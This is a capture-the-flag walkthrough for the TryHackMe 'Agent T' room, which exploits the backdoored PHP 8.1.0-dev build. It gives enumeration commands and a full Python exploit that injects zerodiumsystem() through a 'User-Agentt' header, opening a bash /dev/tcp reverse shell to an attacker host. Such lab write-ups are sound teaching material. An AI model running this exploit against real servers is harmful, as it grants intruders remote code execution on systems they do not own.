# TryHackMe - Agent T Walkthrough

## Overview
**Agent T** is an easy-level room on TryHackMe that demonstrates exploitation of a backdoored development version of PHP (8.1.0-dev). In this walkthrough, I’ll guide you through the enumeration, identification of the vulnerability, and exploitation to gain a shell and capture the flag.

---

## 🧰 Tools Used
- nmap
- curl
- Python3
- Netcat

---

## 🕵️ Step 1: Enumeration
Run an initial nmap scan to identify open services:
```bash
nmap -sC -sV -oN agentt-nmap.txt <target-ip>
```
**Findings:**
- Port 80 open
- HTTP server reveals PHP version: `PHP/8.1.0-dev`

---

## 🔍 Step 2: Investigate HTTP Service
Check the headers to confirm PHP version:
```bash
curl -I http://<target-ip>
```
Look for the `X-Powered-By` header showing `PHP/8.1.0-dev`, which is known to be backdoored.

---

## 💣 Step 3: Exploitation with Reverse Shell
A reverse shell can be triggered by injecting into the `User-Agentt` HTTP header.

### Prepare Netcat Listener:
```bash
nc -nlvp <your-port>
```

### Use Python Script:
```python
#!/usr/bin/env python3
import os, sys, argparse, requests

request = requests.Session()

def check_target(args):
    response = request.get(args.url)
    for header in response.headers.items():
        if "PHP/8.1.0-dev" in header[1]:
            return True
    return False

def reverse_shell(args):
    payload = 'bash -c "bash -i >& /dev/tcp/' + args.lhost + '/' + args.lport + ' 0>&1"'
    injection = request.get(args.url, headers={"User-Agentt": "zerodiumsystem('" + payload + "');"}, allow_redirects = False)

def main(): 
    parser = argparse.ArgumentParser(description="Get a reverse shell from PHP 8.1.0-dev backdoor. Set up a netcat listener in another shell: nc -nlvp <attacker PORT>")
    parser.add_argument("url", metavar='<target URL>', help="Target URL")
    parser.add_argument("lhost", metavar='<attacker IP>', help="Attacker listening IP")
    parser.add_argument("lport", metavar='<attacker PORT>', help="Attacker listening port")
    args = parser.parse_args()
    if check_target(args):
        reverse_shell(args)
    else:
        print("Host is not available or vulnerable, aborting...")
        exit

if __name__ == "__main__":
    main()
```

### Run the script:
```bash
python3 revshell_php_8.1.0-dev.py http://<target-ip> <your-ip> <your-port>
```
If successful, you’ll get a reverse shell on your listener.

---

## 🏁 Step 4: Find the Flag
Once inside the shell, search for the flag:
```bash
find / -name "flag.txt" 2>/dev/null
cat /path/to/flag.txt
```

---

## 🧠 Lessons Learned
- Always inspect HTTP headers and versions.
- Development versions (like PHP 8.1.0-dev) are not meant for production.
- Even one misplaced header (`User-Agentt` vs `User-Agent`) can lead to serious vulnerabilities.

---

## ✅ Completion
Room: **Agent T**  
Difficulty: *Easy*  
Focus: *Remote Code Execution via PHP Backdoor*
